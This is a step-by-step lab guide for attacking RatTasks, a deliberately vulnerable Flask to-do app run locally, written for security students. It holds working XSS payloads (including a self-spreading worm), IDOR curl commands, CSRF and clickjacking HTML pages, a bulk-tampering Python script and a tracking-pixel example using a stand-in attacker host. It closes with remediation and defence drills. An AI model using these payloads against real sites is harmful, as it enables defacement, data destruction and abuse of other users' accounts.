<h1 class='text-3xl font-extrabold mb-4'>RatTasks – Student Exploit Guide (Step‑by‑Step)</h1>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>**Educational use only.** These steps are designed for the RatTasks lab running on your own machine. Do not target systems you don’t own or don’t have explicit permission to test.</blockquote>

<p>Project repository: <a href="https://github.com/The-XSS-Rat/RatDo">https://github.com/The-XSS-Rat/RatDo</a></p>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>0) Setup</h2>

<p>1. Create a Python venv and install deps:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
   python3 -m venv venv &amp;&amp; source venv/bin/activate
   pip install flask werkzeug
</code></pre>
<p>2. Run the app:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
   python app.py
</code></pre>
<p>3. Open **[http://127.0.0.1:5000](http://127.0.0.1:5000)**. Create an account and log in.</p>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>Tip: Keep DevTools → Network tab open to watch requests.</blockquote>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>1) Stored XSS in Task Title</h2>

<p>**Vulnerability:** Task titles are rendered with `|safe`, so HTML/JS executes when the task list renders.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Steps</h3>

<p>1. Log in.</p>
<p>2. In the **Add task** input, paste any of the payloads below and click **Add**:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
   &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
</code></pre>

<p>   Alternative payloads (helpful if a naive `&lt;script&gt;` filter is later added):</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
   &lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;
   &lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;
   &lt;a href=javascript:alert(&#x27;XSS&#x27;)&gt;click me&lt;/a&gt;
</code></pre>
<p>3. Reload or navigate to `/` to trigger execution if needed.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>What you should observe</h3>

<ul class="list-disc ml-6">
<li>An alert pops up. That’s **stored XSS** because your payload is saved to the DB and runs for anyone who views the list.</li>
</ul>

<h3 class='text-xl font-semibold mt-4 mb-2'>Bonus: Using XSS to perform actions</h3>

<p>Because the session cookie is automatically sent by the browser, your script can make **authenticated** requests even if the cookie is `HttpOnly`.</p>

<p>Try editing your own task title via XHR/fetch from XSS:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;script&gt;
fetch(&#x27;/edit/1&#x27;, {
  method: &#x27;POST&#x27;,
  headers: {&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;},
  body: &#x27;title=HACKED+by+XSS&#x27;
});
&lt;/script&gt;
</code></pre>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>Replace `1` with the actual task ID of **your** task. This demonstrates how XSS lets an attacker act as the victim.</blockquote>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>2) IDOR / Broken Access Control on Edit, Delete, Toggle</h2>

<p>**Vulnerability:** The routes `/edit/&lt;id&gt;`, `/delete/&lt;id&gt;`, `/toggle/&lt;id&gt;` do **not** verify that the task belongs to the logged‑in user.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Prepare</h3>

<ul class="list-disc ml-6">
<li>Create **User A** and add a task.</li>
<li>Log out, create **User B** and add a task.</li>
<li>Note: Task IDs are global auto‑increment integers across all users.</li>
</ul>

<h3 class='text-xl font-semibold mt-4 mb-2'>Find valid task IDs</h3>

<p>1. While logged in as **User A**, try to open ids you don’t own using the edit page:</p>

<p>   * Visit: `http://127.0.0.1:5000/edit/1`, `/edit/2`, `/edit/3`, … until you **don’t** see “Task not found” and instead see the **Edit task** form for a task that isn’t yours.</p>
<p>   * This confirms the ID exists and is accessible.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Exploit: Edit someone else’s task (horizontal privilege escalation)</h3>

<ul class="list-disc ml-6">
<li>Using the edit form you just opened, change the title and save. You’ve modified another user’s task.</li>
</ul>

<p>**cURL version (replace `42` with the victim’s task id):**</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
curl -i -X POST \
  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
  -b &#x27;session=&lt;YOUR_FLASK_SESSION_COOKIE&gt;&#x27; \
  --data &#x27;title=Owned+by+User+A&#x27; \
  http://127.0.0.1:5000/edit/42
</code></pre>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>Get your `session` cookie from DevTools → Application → Cookies.</blockquote>

<h3 class='text-xl font-semibold mt-4 mb-2'>Exploit: Toggle someone else’s completion flag</h3>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
curl -i -b &#x27;session=&lt;YOUR_FLASK_SESSION_COOKIE&gt;&#x27; \
  http://127.0.0.1:5000/toggle/42
</code></pre>

<h3 class='text-xl font-semibold mt-4 mb-2'>Exploit: Delete someone else’s task</h3>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
curl -i -b &#x27;session=&lt;YOUR_FLASK_SESSION_COOKIE&gt;&#x27; \
  http://127.0.0.1:5000/delete/42
</code></pre>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>The delete route does not verify ownership and always flashes “Task deleted” even if nothing happened — use `/edit/&lt;id&gt;` first to confirm the ID exists.</blockquote>

<h3 class='text-xl font-semibold mt-4 mb-2'>What you should observe</h3>

<ul class="list-disc ml-6">
<li>You can modify, toggle, or delete tasks **you don’t own**. That’s an **IDOR/BAC** flaw.</li>
</ul>

<h3 class='text-xl font-semibold mt-4 mb-2'>Additional BAC / IDOR scenarios to try</h3>

<ol class="list-decimal ml-6 space-y-1">
<li>Mark a victim’s task as done/undone repeatedly via `/toggle/&lt;id&gt;` to disrupt their workflow.</li>
<li>Overwrite the task title with attacker-controlled HTML (e.g., `&lt;img src=x onerror=...&gt;`) via `/edit/&lt;id&gt;` to weaponize stored XSS in someone else’s account.</li>
<li>Set the `public` checkbox when editing a victim task to expose previously private notes on the `/feed` page.</li>
<li>Clear the `public` checkbox on a collaborator’s public task to silently hide it from the feed.</li>
<li>Append instructions like “Send password to …” into another user’s task title to phish them when they next log in.</li>
<li>Iterate through IDs and delete every task you find, demonstrating how destructive a simple IDOR script can be.</li>
<li>Flip the same task repeatedly to generate misleading activity patterns a blue team would struggle to trust.</li>
<li>Edit a victim’s task to include tracking pixels (e.g., `&lt;img src="https://attacker.tld/pixel"&gt;`) and monitor when they open their list.</li>
<li>Change multiple victim tasks to include unique IDs so you can map which task IDs belong to which victims as they revert the edits.</li>
<li>Use `/edit/&lt;id&gt;` to add markdown-looking text that tricks the victim into following attacker-supplied “instructions”.</li>
<li>Combine delete and edit IDORs: first edit a victim task to warn them, then immediately delete it to show race-condition style tampering.</li>
<li>Force a victim’s “done” tasks back to incomplete status so their dashboard always looks unfinished.</li>
<li>Rename tasks with profanity or defacements to demonstrate reputational risk from unauthorized edits.</li>
<li>Modify someone’s task to embed an `&lt;iframe&gt;` pointing to a malicious site that loads whenever they view their list.</li>
<li>Script an attack that toggles every discovered task ID once per minute, creating chaos across all users simultaneously.</li>
</ol>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>3) CSRF on Add, Edit, Toggle, Delete</h2>

<p>**Vulnerability:** There’s no CSRF protection. State‑changing endpoints accept requests with only the victim’s cookie for auth.</p>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>For the following, the victim must be **logged in** to RatTasks in the same browser.</blockquote>

<h3 class='text-xl font-semibold mt-4 mb-2'>CSRF: Add a task (auto‑submit form)</h3>

<p>Create a local HTML file (e.g., `csrf-add.html`) and open it in your browser while logged in to RatTasks:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;!doctype html&gt;
&lt;form action=&quot;http://127.0.0.1:5000/&quot; method=&quot;POST&quot; id=&quot;f&quot;&gt;
  &lt;input name=&quot;title&quot; value=&quot;CSRF injected task!&quot;&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById(&#x27;f&#x27;).submit();&lt;/script&gt;
</code></pre>

<p>**Result:** A new task appears in the victim account.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>CSRF: Delete a known task via `GET`</h3>

<p>Because delete uses `GET`, an attacker can use an image tag:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;!doctype html&gt;
&lt;img src=&quot;http://127.0.0.1:5000/delete/42&quot; style=&quot;display:none&quot;&gt;
</code></pre>

<p>**Result:** Visiting this page while logged in to RatTasks deletes task `42`.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>CSRF: Toggle a task via `GET`</h3>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;!doctype html&gt;
&lt;img src=&quot;http://127.0.0.1:5000/toggle/42&quot; style=&quot;display:none&quot;&gt;
</code></pre>

<p>**Result:** Task `42` flips between done/undone.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>CSRF: Edit via POST</h3>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;!doctype html&gt;
&lt;form action=&quot;http://127.0.0.1:5000/edit/42&quot; method=&quot;POST&quot; id=&quot;f&quot;&gt;
  &lt;input name=&quot;title&quot; value=&quot;CSRF changed your title&quot;&gt;
&lt;/form&gt;
&lt;script&gt;f.submit();&lt;/script&gt;
</code></pre>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>4) Clickjacking (No Frame Protections)</h2>

<p>**Vulnerability:** No `X-Frame-Options` or CSP → pages can be iframed and overlaid with deceptive UI.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>PoC</h3>

<p>Create `clickjack.html` and open it while logged in:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;!doctype html&gt;
&lt;style&gt;
  iframe { position: absolute; top:0; left:0; width:100vw; height:100vh; opacity:0.1; }
  button.fake { position:absolute; top:120px; left:120px; padding:20px; }
&lt;/style&gt;
&lt;button class=&quot;fake&quot;&gt;Click here for FREE COFFEE ☕&lt;/button&gt;
&lt;iframe src=&quot;http://127.0.0.1:5000/delete/42&quot;&gt;&lt;/iframe&gt;
</code></pre>

<p>**Result:** Clicking the visible button actually clicks the hidden delete link beneath it.</p>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>5) Recon Tips &amp; ID Discovery</h2>

<ul class="list-disc ml-6">
<li>**ID Guessing:** Since IDs are incremental, create a few tasks and note the growth (e.g., your first task might be 7, then 8, etc.). Older IDs likely belong to other accounts.</li>
<li>**Existence Check:** `/edit/&lt;id&gt;` returns an edit form when the ID exists; otherwise you’ll see a “Task not found” flash. Use that to confirm valid IDs.</li>
<li>**Network Tab:** Watch which endpoints the UI calls when you click **Edit**, **Delete**, or toggle the checkbox.</li>
</ul>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>6) Suggested Write‑Up Structure (for reports)</h2>

<p>1. **Title**: Stored XSS in Task Title leads to account actions via authenticated fetch</p>
<p>2. **Summary**: Explain the impact and where the bug lives.</p>
<p>3. **Steps to Reproduce**: Copy the exact steps/payloads above.</p>
<p>4. **Impact**: Session‑authenticated actions; potential for persistent worm; user data manipulation.</p>
<p>5. **Remediation**:</p>

<p>   * Escape output; remove `|safe` unless output is pre‑sanitized.</p>
<p>   * Add CSRF tokens to state‑changing routes; avoid `GET` for destructive actions.</p>
<p>   * Verify ownership on all task mutations: `WHERE id = ? AND user_id = ?`.</p>
<p>   * Add `X-Frame-Options: DENY` and a strict CSP.</p>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>7) Quick Checklist (What to Demonstrate)</h2>

<ul class="list-disc ml-6">
<li>[ ] Add `&lt;script&gt;alert(1)&lt;/script&gt;` task → alert triggers on list view (Stored XSS).</li>
<li>[ ] Use `/edit/&lt;id&gt;` to confirm other users’ task existence.</li>
<li>[ ] Change another user’s task title via `/edit/&lt;id&gt;` (IDOR).</li>
<li>[ ] Delete another user’s task via `/delete/&lt;id&gt;` (IDOR).</li>
<li>[ ] Trigger CSRF add via auto‑submit form.</li>
<li>[ ] Trigger CSRF delete/toggle via hidden `&lt;img&gt;`.</li>
<li>[ ] Demonstrate clickjacking PoC.</li>
</ul>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>That’s it. Keep your tests scoped to your own local RatTasks instance.</blockquote>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>8) IDOR: Force Victim Tasks Public</h2>

<p><strong>Goal:</strong> Use the existing edit IDOR to flip another user’s private task into the public feed.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Steps</h3>

<ol class="list-decimal ml-6 space-y-1">
<li>Enumerate a task ID owned by another user (see Module 2 for techniques).</li>
<li>Visit <code>http://127.0.0.1:5000/edit/&lt;victim_id&gt;</code> while logged in as yourself.</li>
<li>Check the <strong>Public</strong> box, keep or change the title, and click <strong>Save</strong>.</li>
<li>Open <code>/feed</code> in a separate tab or browser profile.</li>
</ol>

<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>

<ul class="list-disc ml-6">
<li>The victim’s task now appears on the public feed, even though they never opted in. This demonstrates a <strong>privacy impact</strong> from the IDOR.</li>
</ul>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>9) IDOR: Bulk Tampering Script</h2>

<p><strong>Goal:</strong> Automate BAC exploitation to show how little effort it takes to destroy data at scale.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Proof-of-concept script (Python + <code>requests</code>)</h3>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>import requests

BASE = &quot;http://127.0.0.1:5000&quot;
COOKIE = {&quot;session&quot;: &quot;&lt;paste_your_cookie_here&gt;&quot;}

for task_id in range(1, 101):
    r = requests.post(
        f&quot;{BASE}/edit/{task_id}&quot;,
        data={&quot;title&quot;: f&quot;Owned #{task_id}&quot;, &quot;public&quot;: &quot;on&quot;},
        cookies=COOKIE,
        allow_redirects=False,
    )
    if r.status_code == 302:
        print(f&quot;Edited task {task_id}&quot;)</code></pre>

<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>

<ul class="list-disc ml-6">
<li>In seconds you can mass-edit titles and flip tasks public, illustrating how dangerous an unprotected IDOR can be once scripted.</li>
</ul>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>10) Stored XSS Worm via Public Feed</h2>

<p><strong>Goal:</strong> Chain the stored XSS with BAC so any victim who views the feed unknowingly propagates the payload.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Steps</h3>

<ol class="list-decimal ml-6 space-y-1">
<li>Use Module 8 to make a victim task public.</li>
<li>Edit that task and replace the title with:</li>
</ol>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>&lt;script&gt;
fetch(&#x27;/edit/42&#x27;, {
  method: &#x27;POST&#x27;,
  headers: {&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;},
  body: &#x27;title=&#x27; + encodeURIComponent(&#x27;Worm!&#x27;) + &#x27;&amp;public=on&#x27;
});
fetch(&#x27;/&#x27;, {
  method: &#x27;POST&#x27;,
  headers: {&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;},
  body: &#x27;title=Worm+propagation&amp;public=on&#x27;
});
&lt;/script&gt;</code></pre>

<p>3. View <code>/feed</code> in another browser. The script runs for any logged-in viewer, adding more worm tasks. Replace <code>42</code> with the victim task ID you discovered.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>

<ul class="list-disc ml-6">
<li>A single malicious edit can spread automatically, showcasing combined impact of stored XSS + BAC.</li>
</ul>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>11) CSRF + IDOR Chain</h2>

<p><strong>Goal:</strong> Build an external page that tricks an authenticated victim into editing someone else’s task on your behalf.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Steps</h3>

<ol class="list-decimal ml-6 space-y-1">
<li>Identify a target task ID (e.g., <code>37</code>).</li>
<li>Create a file <code>csrf-idor.html</code> with:</li>
</ol>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>&lt;!doctype html&gt;
&lt;form action=&quot;http://127.0.0.1:5000/edit/37&quot; method=&quot;POST&quot; id=&quot;steal&quot;&gt;
  &lt;input name=&quot;title&quot; value=&quot;CSRF defacement&quot;&gt;
  &lt;input name=&quot;public&quot; value=&quot;on&quot;&gt;
&lt;/form&gt;
&lt;script&gt;steal.submit();&lt;/script&gt;</code></pre>

<p>3. Send the link to a logged-in victim. When they open it, their browser submits the form.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>

<ul class="list-disc ml-6">
<li>The victim unknowingly edits another user’s task. This demonstrates how CSRF multiplies the blast radius of the existing IDOR.</li>
</ul>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>12) Blue Team Mitigation Drills</h2>

<p>Use these scenarios to practice defending the app after demonstrating the exploits:</p>

<ul class="list-disc ml-6">
<li>Add ownership checks (<code>WHERE id = ? AND user_id = ?</code>) on every task mutation.</li>
<li>Log suspicious patterns like dozens of edits from a single IP in seconds.</li>
<li>Add CSRF tokens and require POST/DELETE for destructive actions.</li>
<li>Sanitize or escape task titles before rendering; remove <code>|safe</code> entirely.</li>
<li>Require re-authentication before enabling the <strong>Public</strong> flag to avoid silent privacy flips.</li>
</ul>